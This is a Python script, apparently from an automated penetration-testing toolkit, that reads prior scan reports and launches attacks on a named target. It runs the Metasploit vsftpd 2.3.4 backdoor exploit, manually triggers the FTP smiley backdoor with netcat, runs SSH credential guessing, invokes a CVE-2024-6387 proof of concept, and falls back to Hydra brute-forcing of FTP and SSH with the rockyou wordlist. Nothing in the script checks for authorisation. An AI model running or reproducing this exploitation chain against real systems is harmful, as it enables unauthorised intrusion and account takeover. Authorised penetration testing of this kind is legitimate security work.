# core/exploit.py

import re
import subprocess
from pathlib import Path

OUTPUT_DIR = Path("outputs")
SUMMARY = OUTPUT_DIR / "exploitation_summary.md"

def run_cmd(cmd):
    print(f"[CMD] {' '.join(cmd)}")
    try:
        return subprocess.check_output(cmd, stderr=subprocess.STDOUT, text=True)
    except subprocess.CalledProcessError as e:
        return e.output

def analyze_scans(target):
    prints = ["## Scan analysis\n"]
    for phase in ("fast", "full", "udp"):
        path = OUTPUT_DIR / f"{target}_{phase}.txt"
        if path.exists():
            content = path.read_text()
            prints.append(f"### {phase.capitalize()} scan\n")
            prints.append("```\n" + "\n".join(content.splitlines()[:20]) + "\n```")
            if "open" in content.lower():
                prints.append(f"- Detected open ports in {phase} scan\n")
    return "\n".join(prints)

def exploit_ftp(report_md: Path, target):
    print(f"[exploit] FTP -> {report_md}")
    content = report_md.read_text().lower()
    out = ["## FTP Exploitation\n"]
    if "vsftpd 2.3.4" in content:
        out.append("- vsftpd 2.3.4 => Metasploit backdoor")
        run_cmd(["msfconsole","-q","-x",
                 f"use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {target}; set PAYLOAD cmd/unix/interact; exploit; exit"])
    elif ":)" in content:
        out.append("- Smiley backdoor => manual attempt")
        run_cmd(["bash","-c",f'(echo -e "USER user:)\\r\nPASS pass"; sleep 1) | nc {target} 21'])
        run_cmd(["nc",target,"6200","-q","5"])
    else:
        out.append("- No brute exploitation: launching Hydra brute-force")
        run_cmd(["hydra","-L","/usr/share/wordlists/fasttrack.txt",
                 "-P","/usr/share/wordlists/rockyou.txt",
                 target,"ftp","-t","4","-f","-V"])
    return "\n".join(out)

def exploit_ssh(report_md: Path, target):
    print(f"[exploit] SSH -> {report_md}")
    content = report_md.read_text().lower()
    out = ["## SSH Exploitation\n"]
    if re.search(r"openssh_5\.", content) or re.search(r"openssh_6\.", content):
        out.append("- OpenSSH 5.x/6.x => Metasploit ssh_login")
        run_cmd(["msfconsole","-q","-x",
                 f"use auxiliary/scanner/ssh/ssh_login; set RHOSTS {target}; "
                 "set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt; "
                 "set STOP_ON_SUCCESS true; set VERBOSE true; exploit; exit"])
    elif re.search(r"openssh_[89]\.\d+p\d+", content):
        out.append("- Potential CVE-2024-6387 => launching PoC")
        run_cmd(["python3","/usr/share/exploits/CVE-2024-6387.py", target, "22", "--exploit"])
    else:
        out.append("- No auto exploit: Hydra brute-force SSH")
        run_cmd(["hydra","-L","/usr/share/wordlists/users.txt",
                 "-P","/usr/share/wordlists/rockyou.txt",
                 target,"ssh","-t","4","-f","-V"])
    return "\n".join(out)

def main():
    import argparse
    parser=argparse.ArgumentParser()
    parser.add_argument("target")
    args=parser.parse_args()
    target=args.target

    print("[exploit] Starting exploitation.")
    lines=[f"# Exploitation Summary for {target}\n"]
    lines.append(analyze_scans(target))

    for rpt in OUTPUT_DIR.glob(f"{target}_*_report.md"):
        if rpt.name.endswith("_ftp_report.md"):
            lines.append(exploit_ftp(rpt,target))
        elif rpt.name.endswith("_ssh_report.md"):
            lines.append(exploit_ssh(rpt,target))

    with SUMMARY.open("w") as f:
        f.write("\n\n".join(lines))

    print(f"[âœ“] Report written to {SUMMARY}")

if __name__ == "__main__":
    main()
